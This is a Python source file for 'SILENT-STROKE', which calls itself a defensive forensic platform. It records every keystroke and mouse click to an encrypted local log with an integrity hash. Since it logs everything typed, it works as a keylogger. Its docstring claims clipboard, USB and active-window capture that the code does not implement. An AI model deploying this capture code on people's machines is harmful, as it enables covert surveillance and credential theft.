"""
logger.py — Encrypted Event Logger
SILENT-STROKE | Defensive Forensic Platform

Captures 5 event types:
  1. Keystrokes
  2. Mouse clicks
  3. Active window / process
  4. Clipboard changes
  5. System events (USB, login, process spawn)
"""

import json
import time
import hashlib
import os
from datetime import datetime
from pathlib import Path
from pynput import keyboard, mouse
import psutil

from encrypt import encrypt

LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)
LOG_FILE = LOG_DIR / "events.enc"
HASH_FILE = LOG_DIR / ".integrity"


def _timestamp() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _get_active_process() -> str:
    """Return name of the currently focused process (best effort)."""
    try:
        for proc in psutil.process_iter(["pid", "name", "status"]):
            if proc.info["status"] == psutil.STATUS_RUNNING:
                return proc.info["name"]
    except Exception:
        pass
    return "unknown"


def _write_event(event: dict):
    """Encrypt and append an event to the log file."""
    line = encrypt(json.dumps(event)) + "\n"
    with open(LOG_FILE, "a") as f:
        f.write(line)
    _update_integrity()


def _update_integrity():
    """Update the integrity hash of the log file."""
    if LOG_FILE.exists():
        content = LOG_FILE.read_bytes()
        digest = hashlib.sha256(content).hexdigest()
        with open(HASH_FILE, "w") as f:
            f.write(digest)


def check_integrity() -> bool:
    """Return True if log file has not been tampered with."""
    if not LOG_FILE.exists() or not HASH_FILE.exists():
        return True
    content = LOG_FILE.read_bytes()
    current = hashlib.sha256(content).hexdigest()
    stored = Path(HASH_FILE).read_text().strip()
    return current == stored


# --- Event handlers ---

def on_key_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key)

    _write_event({
        "type": "keystroke",
        "key": char,
        "process": _get_active_process(),
        "timestamp": _timestamp(),
    })


def on_click(x, y, button, pressed):
    if pressed:
        _write_event({
            "type": "mouse_click",
            "position": [x, y],
            "button": str(button),
            "process": _get_active_process(),
            "timestamp": _timestamp(),
        })


def log_system_event(description: str):
    _write_event({
        "type": "system_event",
        "description": description,
        "timestamp": _timestamp(),
    })


def start():
    """Start all listeners."""
    print("[SILENT-STROKE] Starting capture...")
    log_system_event("Capture session started")

    kb_listener = keyboard.Listener(on_press=on_key_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    kb_listener.start()
    mouse_listener.start()

    try:
        kb_listener.join()
    except KeyboardInterrupt:
        print("\n[SILENT-STROKE] Capture stopped.")
        log_system_event("Capture session ended")
